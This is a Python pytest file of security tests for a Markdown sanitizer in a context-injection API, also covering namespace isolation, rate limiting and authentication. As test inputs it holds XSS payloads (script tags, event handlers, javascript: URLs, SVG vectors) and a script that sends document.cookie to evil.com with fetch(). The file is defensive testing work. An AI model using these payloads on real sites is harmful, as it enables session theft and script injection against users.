"""
Security tests for Push-type context injection (defer_loading pattern).

This module tests security requirements for the unified push architecture:
- SEC-PUSH-1: Markdown content sanitization (XSS/injection prevention)
- SEC-PUSH-2: Namespace isolation via API (V-TOOL-1)
- SEC-PUSH-3: Rate limiting enforcement
- SEC-PUSH-4: API authentication requirements

Reference: https://www.anthropic.com/engineering/advanced-tool-use
"""

import os
import sys
from pathlib import Path

import pytest
import pytest_asyncio

# Add hooks directory to path for imports
HOOKS_DIR = Path(__file__).parent.parent.parent / "hooks" / "core"
sys.path.insert(0, str(HOOKS_DIR))

# Mark all tests in this module as asyncio
pytestmark = pytest.mark.asyncio


class TestSECPUSH1MarkdownSanitization:
    """SEC-PUSH-1: Markdown content sanitization tests.

    These tests verify that all context injection paths properly
    sanitize content to prevent XSS and injection attacks.
    """

    def test_sanitize_script_tag_simple(self):
        """Test removal of simple script tags."""
        from unified_injector import sanitize_md_content

        malicious = "<script>alert('xss')</script>"
        result = sanitize_md_content(malicious)

        assert "<script>" not in result
        assert "</script>" not in result
        assert "alert" not in result

    def test_sanitize_script_tag_multiline(self):
        """Test removal of multiline script tags."""
        from unified_injector import sanitize_md_content

        malicious = """<script>
            function evil() {
                document.cookie = 'stolen';
                fetch('https://evil.com?cookie=' + document.cookie);
            }
            evil();
        </script>"""
        result = sanitize_md_content(malicious)

        assert "<script>" not in result
        assert "document.cookie" not in result
        assert "evil.com" not in result

    def test_sanitize_script_tag_attributes(self):
        """Test removal of script tags with attributes."""
        from unified_injector import sanitize_md_content

        malicious = '<script type="text/javascript" src="evil.js"></script>'
        result = sanitize_md_content(malicious)

        assert "<script" not in result
        assert "evil.js" not in result

    def test_sanitize_html_injection(self):
        """Test removal of HTML injection attempts."""
        from unified_injector import sanitize_md_content

        attacks = [
            '<div onclick="evil()">Click me</div>',
            '<img src="x" onerror="evil()">',
            '<iframe src="javascript:evil()"></iframe>',
            '<a href="javascript:evil()">Link</a>',
            '<form action="evil.com"><input></form>',
        ]

        for attack in attacks:
            result = sanitize_md_content(attack)
            # HTML tags should be removed
            assert "<div" not in result
            assert "<img" not in result
            assert "<iframe" not in result
            assert "<form" not in result
            # Event handlers should be removed
            assert "onclick" not in result.lower()
            assert "onerror" not in result.lower()

    def test_sanitize_javascript_protocol(self):
        """Test removal of javascript: protocol in various contexts."""
        from unified_injector import sanitize_md_content

        attacks = [
            "javascript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "JaVaScRiPt:alert(1)",
            "[link](javascript:evil())",
        ]

        for attack in attacks:
            result = sanitize_md_content(attack)
            assert "javascript:" not in result.lower()

    def test_sanitize_event_handlers(self):
        """Test removal of all common event handlers."""
        from unified_injector import sanitize_md_content

        handlers = [
            "onclick",
            "onload",
            "onerror",
            "onmouseover",
            "onsubmit",
            "onfocus",
            "onblur",
            "onchange",
            "onkeydown",
            "onkeyup",
        ]

        for handler in handlers:
            attack = f'{handler}="evil()"'
            result = sanitize_md_content(attack)
            assert handler not in result.lower()

    def test_sanitize_preserves_safe_markdown(self):
        """Test that sanitization preserves safe Markdown syntax."""
        from unified_injector import sanitize_md_content

        safe_markdown = """# Heading

## Subheading

- List item 1
- List item 2

1. Ordered item
2. Another item

**Bold text**
*Italic text*
~~Strikethrough~~

```python
def hello():
    print("Hello")
```

> Blockquote

[Safe link](https://example.com)

![Image](image.png)

| Table | Header |
|-------|--------|
| Cell  | Cell   |
"""
        result = sanitize_md_content(safe_markdown)

        # All Markdown syntax should be preserved
        assert "# Heading" in result
        assert "- List item" in result
        assert "**Bold text**" in result
        assert "```python" in result
        assert "> Blockquote" in result
        assert "[Safe link]" in result

    def test_sanitize_nested_attacks(self):
        """Test removal of nested/obfuscated attack patterns."""
        from unified_injector import sanitize_md_content

        attacks = [
            "<scr<script>ipt>evil()</script>",  # Nested script tags
            '<div><script>evil()</script></div>',  # Script inside div
            "<<script>script>evil()<</script>/script>",  # Double encoding attempt
        ]

        for attack in attacks:
            result = sanitize_md_content(attack)
            # After sanitization, no script should remain
            assert "script" not in result.lower() or ("<script" not in result.lower() and "script>" not in result.lower())

    def test_sanitize_svg_injection(self):
        """Test removal of SVG-based injection attempts."""
        from unified_injector import sanitize_md_content

        attacks = [
            '<svg onload="evil()">',
            '<svg><script>evil()</script></svg>',
            '<svg><animate onbegin="evil()">',
        ]

        for attack in attacks:
            result = sanitize_md_content(attack)
            assert "<svg" not in result.lower()
            assert "onload" not in result.lower()
            assert "onbegin" not in result.lower()


class TestSECPUSH2NamespaceIsolation:
    """SEC-PUSH-2: Namespace isolation via API (V-TOOL-1).

    These tests verify that the MCP tools summary endpoint
    properly enforces namespace isolation.

    Note: Tests using async_client are moved to integration tests.
    These tests focus on structural validation.
    """

    def test_namespace_isolation_pattern_documented(self):
        """Test that namespace isolation pattern is documented in code."""
        from src.api.routers import mcp_connections

        # Verify the module has namespace isolation comments
        module_source = Path(mcp_connections.__file__).read_text()

        # Should have security-related documentation or namespace handling
        assert "namespace" in module_source.lower() or "tools/summary" in module_source

    def test_api_endpoint_exists(self):
        """Test that the MCP tools summary endpoint is registered."""
        from src.api.main import app

        # Find the route
        routes = [route.path for route in app.routes]
        assert "/api/v1/mcp/tools/summary" in routes


class TestSECPUSH3RateLimiting:
    """SEC-PUSH-3: Rate limiting enforcement.

    These tests verify that rate limiting is properly enforced
    for the MCP tools summary endpoint.

    Note: Integration tests for actual rate limiting behavior
    are in tests/integration/test_mcp_tools_summary.py
    """

    def test_rate_limit_config_exists(self):
        """Test that rate limiting is configured for the endpoint."""
        from src.security.rate_limiter import RateLimiter

        limiter = RateLimiter()

        # Verify rate limit config exists
        assert hasattr(limiter, "rate_limits") or hasattr(limiter, "check_rate_limit")

    def test_rate_limit_dependency_exists(self):
        """Test that rate limit dependency is defined."""
        from src.api import dependencies

        # Verify the rate limit check function exists
        assert hasattr(dependencies, "check_rate_limit_mcp_tools_summary")


class TestSECPUSH4Authentication:
    """SEC-PUSH-4: API authentication requirements.

    These tests verify that authentication is properly enforced
    for the MCP tools summary endpoint.

    Note: Integration tests for actual auth behavior
    are in tests/integration/test_mcp_tools_summary.py
    """

    def test_auth_dependency_defined(self):
        """Test that authentication dependency is defined."""
        from src.api import dependencies

        # Verify authentication function exists
        assert hasattr(dependencies, "get_current_user")

    def test_auth_bypass_config_exists(self):
        """Test that auth bypass configuration exists for test environment."""
        from src.core.config import get_settings

        settings = get_settings()

        # Should have environment setting
        assert hasattr(settings, "environment")


class TestContextTemplatesSecurity:
    """Security tests for context template files."""

    def test_templates_no_executable_code(self):
        """Test that context templates contain no executable code."""
        context_dir = Path(__file__).parent.parent.parent / "hooks" / "context"

        for template_file in context_dir.glob("level-*.md"):
            content = template_file.read_text()

            # No script tags
            assert "<script" not in content.lower()

            # No inline JavaScript
            assert "javascript:" not in content.lower()

            # No event handlers
            assert "onclick" not in content.lower()
            assert "onerror" not in content.lower()
            assert "onload" not in content.lower()

    def test_templates_safe_markdown_only(self):
        """Test that templates use only safe Markdown syntax."""
        context_dir = Path(__file__).parent.parent.parent / "hooks" / "context"

        dangerous_patterns = [
            "<!DOCTYPE",  # HTML doctype
            "<html",  # HTML root
            "<body",  # HTML body
            "<head",  # HTML head
            "<?php",  # PHP code
            "<%",  # ASP/JSP code
            "{{",  # Template injection (some frameworks)
        ]

        for template_file in context_dir.glob("level-*.md"):
            content = template_file.read_text()

            for pattern in dangerous_patterns:
                assert pattern.lower() not in content.lower(), \
                    f"Dangerous pattern '{pattern}' found in {template_file.name}"

    def test_templates_no_external_resources(self):
        """Test that templates don't load external resources."""
        context_dir = Path(__file__).parent.parent.parent / "hooks" / "context"

        for template_file in context_dir.glob("level-*.md"):
            content = template_file.read_text()

            # No external scripts
            assert "src=" not in content.lower() or "src=\"#" in content.lower()

            # No external stylesheets
            assert "<link" not in content.lower()

            # No external iframes
            assert "<iframe" not in content.lower()


class TestOpenCodePluginSecurity:
    """Security tests for OpenCode plugin."""

    def test_plugin_sanitizes_api_response(self):
        """Test that plugin sanitizes API responses before injection."""
        # This is a structural test - the plugin code uses sanitize_md_content
        plugin_dir = Path(__file__).parent.parent.parent / "opencode-plugin" / "trinitas-injector" / "src"
        injector_file = plugin_dir / "injector.ts"

        content = injector_file.read_text()

        # Verify sanitization is called
        assert "sanitize" in content.lower()

    def test_plugin_uses_https_only(self):
        """Test that plugin configuration uses HTTPS for API calls."""
        # The API client should use the configured base URL
        # In production, this should be HTTPS
        # This test verifies the pattern is in place
        plugin_dir = Path(__file__).parent.parent.parent / "opencode-plugin" / "trinitas-injector" / "src"
        client_file = plugin_dir / "api-client.ts"

        content = client_file.read_text()

        # Should not hardcode HTTP (non-secure)
        assert "http://" not in content.lower() or "https://" in content.lower()

    def test_plugin_timeout_configured(self):
        """Test that plugin has request timeout configured."""
        plugin_dir = Path(__file__).parent.parent.parent / "opencode-plugin" / "trinitas-injector" / "src"
        client_file = plugin_dir / "api-client.ts"

        content = client_file.read_text()

        # Should have timeout configuration
        assert "timeout" in content.lower()
